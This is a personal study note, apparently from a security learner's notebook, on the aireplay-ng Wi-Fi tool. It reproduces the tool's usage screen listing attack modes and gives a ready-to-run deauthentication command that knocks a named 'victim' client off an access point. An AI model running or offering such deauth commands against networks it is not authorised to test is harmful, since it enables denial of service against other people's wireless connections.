---
Author: Sumit Kumar
Email: ravirajkarn21@gmail.com
Date Created: 2025-10-09 12:40::28 PM
tags:
  - wifi
  - wireless
  - DoS_attack
  - Linux
  - command
  - network
---
# aireplay-ng 

- man page is pretty good to learn all about the command.
```bash
  usage: aireplay-ng <options> <replay interface>

  Filter options:

      -b bssid  : MAC address, Access Point
      -d dmac   : MAC address, Destination
      -s smac   : MAC address, Source
      -m len    : minimum packet length
      -n len    : maximum packet length
      -u type   : frame control, type    field
      -v subt   : frame control, subtype field
      -t tods   : frame control, To      DS bit
      -f fromds : frame control, From    DS bit
      -w iswep  : frame control, WEP     bit
      -D        : disable AP detection

  Replay options:

      -x nbpps  : number of packets per second
      -p fctrl  : set frame control word (hex)
      -a bssid  : set Access Point MAC address
      -c dmac   : set Destination  MAC address
      -h smac   : set Source       MAC address
      -g value  : change ring buffer size (default: 8)
      -F        : choose first matching packet

      Fakeauth attack options:

      -e essid  : set target AP SSID
      -o npckts : number of packets per burst (0=auto, default: 1)
      -q sec    : seconds between keep-alives
      -Q        : send reassociation requests
      -y prga   : keystream for shared key auth
      -T n      : exit after retry fake auth request n time

      Arp Replay attack options:

      -j        : inject FromDS packets

      Fragmentation attack options:

      -k IP     : set destination IP in fragments
      -l IP     : set source IP in fragments

      Test attack options:

      -B        : activates the bitrate test

  Source options:

      -i iface  : capture packets from this interface
      -r file   : extract packets from this pcap file

  Miscellaneous options:

      -R                    : disable /dev/rtc usage
      --ignore-negative-one : if the interface's channel can't be determined,
                              ignore the mismatch, needed for unpatched cfg80211
      --deauth-rc rc        : Deauthentication reason code [0-254] (Default: 7)

  Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen

No replay interface specified.
```

## commands
- **[Deauthenticating Attack](Deauthenticating.md)**
```bash
sudo aireplay-ng --deauth 1 -a 32:49:1E:B8:8B:9C -c 00:71:CC:3A:31:0F mon0
```
Description: 
- `--deauth <count>` : Type of attack is to launch. number stations to attack.
- `-a <ap mac>` : disguise as mac address.
- `-c <client mac>` : victim mac address.
- `mon0` : It is interface name.
